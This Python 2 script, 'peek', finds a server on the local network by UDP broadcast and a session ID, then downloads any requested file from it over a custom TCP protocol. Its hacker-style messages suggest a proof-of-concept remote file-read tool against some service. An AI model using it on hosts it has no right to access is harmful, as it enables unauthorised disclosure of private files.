#!/usr/bin/env python
import sys, os, socket, struct, errno

USAGE_MSG = "USAGE: peek <SID> <path to file on server>"
TIMEOUT = 2
MAGIC_PREFIX = ''.join([chr(x) for x in (0xDE, 0xAF)])
FIND_SERVER_PREFIX = MAGIC_PREFIX + chr(0x01)
GET_FILE_PREFIX = MAGIC_PREFIX + chr(0x03)
CWD = os.getcwd()
RECV_BUFFER_SIZE = 1048576 # 1MB

def main(args):
	try:
		sid = long(args[0])
		file_path = str(args[1])
	except:
		_die(USAGE_MSG)
	server = find_server(sid)
	if server is None:
		_die("Cannot find server")
	if not get_file(server, file_path):
		_die("Failed to get file")
	print "[+] The holy cow rocks: file downloaded."

def find_server(sid):
	s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
	s.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
	s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
	s.settimeout(TIMEOUT)
	s.bind(('', 1338))
	data = FIND_SERVER_PREFIX + struct.pack("!I", sid)
	s.sendto(data, ('<broadcast>', 1337))
	try:
		data, address = s.recvfrom(13)
	except socket.timeout:
		return None
	server_port = struct.unpack("!H", data[7:9])[0]
	server_ip = address[0]
	return server_ip, server_port

def get_file(server, file_path):
	data = GET_FILE_PREFIX + struct.pack("!H%ss" % len(file_path), len(file_path), file_path)
	if "\\" in file_path and os.sep == "/":
		_, file_name = os.path.split(os.path.normpath(file_path.replace("\\", "/")))
	else:
		_, file_name = os.path.split(os.path.normpath(file_path))
	file_new_path = os.path.join(CWD, file_name)
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect(server)
	s.sendall(data)
	try:
		data = s.recv(7)
	except socket.error as (error_number, error_msg):
		if error_number == errno.ECONNRESET:
			_warn("Server reset connection, probably file not found or file busy.")
		else:
			try: s.close()
			except: pass
		return False
	if len(data) < 7:
		_warn("Server closed connection, probably file not found.")
		s.close()
		return False
	file_length = struct.unpack("!I", data[3:7])[0]
	print "[+] Found file: downloading %s bytes." % file_length
	save_file_from_sock(s, file_new_path, file_length)
	s.close()
	return True

def save_file_from_sock(sock, file_path, file_length):
	bytes_read = 0
	with open(file_path, "wb") as f:
		while bytes_read < file_length:
			data = sock.recv(RECV_BUFFER_SIZE)
			bytes_read += len(data)
			f.write(data)

def _die(msg, exitcode = -1):
	print >> sys.stderr, "[-] %s" % msg
	exit(exitcode)

def _warn(msg):
	print >> sys.stderr, "[-] %s" % msg

if __name__ == "__main__":
	main(sys.argv[1:])
